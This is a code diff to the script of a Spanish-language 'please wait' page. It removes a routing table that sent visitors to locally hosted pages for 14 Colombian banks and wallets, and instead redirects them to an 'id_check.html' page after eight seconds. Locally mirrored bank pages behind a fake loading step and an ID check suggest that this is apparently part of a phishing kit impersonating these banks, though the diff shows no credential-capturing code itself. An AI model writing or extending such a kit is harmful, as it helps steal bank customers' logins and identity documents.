@@ -70,37 +70,15 @@ Esto puede tardar unos segundos...
 <div class="footer"></div>
 
 <script>
-const banco = localStorage.getItem("banco");
+const banco = localStorage.getItem("recarga_banco_seleccionado") || localStorage.getItem("banco");
 
 if (!banco) {
 window.location.href = "index.html";
 }
 
-const rutas = {
-"BANCO DAVIVIENDA":"Banco/Davivienda/index.html",
-"BANCO DE BOGOTA":"Banco/Bogota/index.html",
-"BANCO POPULAR":"Banco/Popular/index.html",
-"BANCO BBVA COLOMBIA S.A.":"Banco/BBVA/index.html",
-"BANCO AV VILLAS":"Banco/AvVillas/index.html",
-"BANCO DE OCCIDENTE":"Banco/Occidente/index.html",
-"BANCO FALABELLA":"Banco/Falabella/index.html",
-"BANCO GNB SUDAMERIS":"Banco/Gnb/index.html",
-"BANCO ITAU":"Banco/Itau/index.html",
-"DAVIPLATA":"Banco/Daviplata/index.html",
-"BANCOLOMBIA":"Banco/Bancolombia/index.html",
-"GLOBAL66":"Banco/Global66/index.html",
-"BANCO CAJA SOCIAL":"Banco/Social/index.html",
-"NU":"Banco/Nu/index.html"
-};
-
+// Redirigir a id_check.html después de 8 segundos
 setTimeout(() => {
-
-if (rutas[banco]) {
-window.location.href = rutas[banco];
-} else {
-window.location.href = "index.html";
-}
-
+window.location.href = "id_check.html";
 }, 8000);
 </script>
 
